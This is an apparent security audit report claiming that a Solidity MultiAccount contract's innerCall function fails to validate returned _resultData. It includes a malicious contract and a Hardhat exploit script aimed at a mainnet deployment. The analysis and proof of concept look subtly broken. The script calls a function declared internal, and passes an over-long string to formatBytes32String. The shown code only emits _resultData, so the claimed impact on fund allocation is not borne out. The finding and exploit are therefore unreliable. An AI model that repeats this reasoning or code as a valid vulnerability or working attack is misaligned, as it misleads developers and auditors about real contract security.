# Unsafe external calls without proper data handling on `innerCall` mechanism allows for malicious `_resultData` being intrepeted as benign by the protocol
## Summary

The `MultiAccount` contract does not handle external calls with proper checks on the return data. When dealing with external contract calls, it's important to check the return data to ensure the expected data is returned and not maliciously manipulated. 

## Vulnerability Detail

In the function `innerCall`, the `MultiAccount` contract makes an external call to another contract and directly requires that the success boolean is `true`. However, it **does not validate** the data returned from this call (`_resultData`). An attacker might be able to return a `true` boolean but with malicious `_resultData` that could affect the behavior of the contract.

```solidity
function innerCall(address account, bytes memory _callData) internal {
 (bool _success, bytes memory _resultData) = ISymmioPartyA(account)
 ._call(_callData);
 emit Call(msg.sender, account, _callData, _success, _resultData);
 require(_success, "MultiAccount: Error occurred");
}
```

`innerCall` is consequently called within `depositAndAllocateForAccount`:

https://github.com/sherlock-audit/2023-08-symmetrical/blob/main/symmio-core/contracts/multiAccount/MultiAccount.sol#L173

and `withdrawFromAccount` accordingly:

https://github.com/sherlock-audit/2023-08-symmetrical/blob/main/symmio-core/contracts/multiAccount/MultiAccount.sol#L188

Furthermore, it is worth to point out that the `_resultData` param is also used within the `_call` function, in the `SymmioPartyA` contract:

https://github.com/sherlock-audit/2023-08-symmetrical/blob/main/symmio-core/contracts/multiAccount/SymmioPartyA.sol#L40

## Impact

An attacker can deploy a malicious contract that returns `true` for the success boolean but manipulates `_resultData` for nefarious purposes, impacting the protocol's correct operation. For example, the `depositAndAllocateForAccount` function utilizes `innerCall` to allocate funds. A malicious actor could manipulate `_resultData` to alter the allocation.

## Code Snippet

## Tool used

Manual review.

## Recommendation

- Validate the return data (`_resultData`) in addition to checking the success boolean.
- In the cases where you expect no return data, assert that `_resultData` is empty.
- If you expect specific return data, verify that the returned data matches your expectations before acting upon it.

## POC

> To demonstrate the vulnerability, we'll need to:

1. Implement the `ISymmioPartyA` interface in a malicious contract.
2. This contract will return `true` as the success boolean and a manipulated `_resultData`.
3. Then, a script will be used to deploy this malicious contract and interact with `MultiAccount` to trigger the vulnerability.

For instance, the POC script should demonstrate that the return data (`_resultData`) of an external call from the `innerCall` function is being manipulated.

The main objective of the script will be:

> 1. Deploy a malicious contract that returns arbitrary manipulated `_resultData`.
> 2. Make the `MultiAccount` contract invoke `innerCall` with the malicious contract as the target. This way, it can be demonstrated how `_resultData` is manipulated.

> Deploying a malicious implementation -

```solidity
// MaliciousSymmioPartyA.sol

pragma solidity >=0.8.18;

import "./ISymmioPartyA.sol";

contract MaliciousSymmioPartyA is ISymmioPartyA {
    function _call(bytes calldata _callData) external override returns (bool _success, bytes memory _resultData) {
        // Return true for the success boolean, and return manipulated _resultData
        // Here the arbitrary manipulated data is "malicious_data", but any data can be used.
        return (true, bytes("malicious_data"));
    }

    function _approve(address token, uint256 amount) external override {
        // Dummy function for interface compliance
    }

    function withdrawERC20(address token, uint256 amount) external override {
        // Dummy function for interface compliance
    }
}
```

> Deploying the script -

```javascript
// exploit.js

const { ethers } = require("hardhat");

async function main() {
    // Deploy the malicious implementation
    const MaliciousSymmioPartyA = await ethers.getContractFactory("MaliciousSymmioPartyA");
    const maliciousSymmioPartyA = await MaliciousSymmioPartyA.deploy();
    console.log(`Deployed MaliciousSymmioPartyA at ${maliciousSymmioPartyA.address}`);

    // Get an instance of the MultiAccount contract. Replace <MultiAccount_Address> with the actual deployed address.
    const MultiAccount = await ethers.getContractAt("MultiAccount", "<MultiAccount_Address>");

    // Constructing _callData according to the `SymmioPartyA` contract
    const _callData = ethers.utils.formatBytes32String("allocate(uint256)");

    // Invoke the MultiAccount contract using the malicious contract as the target for innerCall
    const tx = await MultiAccount.innerCall(maliciousSymmioPartyA.address, _callData);
    const receipt = await tx.wait();

    // Log the emitted Call event from MultiAccount to see the `_resultData`
    const CallEvent = receipt.events?.filter(x => x.event === 'Call')[0];
    console.log(`Called MultiAccount.innerCall with _resultData: ${CallEvent.args._resultData}`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
```

should run the above script with the following command:

```bash
npx hardhat run exploit.js --network hardhat
```

Replace `<MultiAccount_Address>` in the script with the actual deployed address of the `MultiAccount` contract on mainnet.

After running the script, it should demonstrate that the `MultiAccount` contract's `innerCall` function can be manipulated by a malicious impl to return arbitrary `_resultData` (one of many exploitation possibilities). This proves the vulnerability.
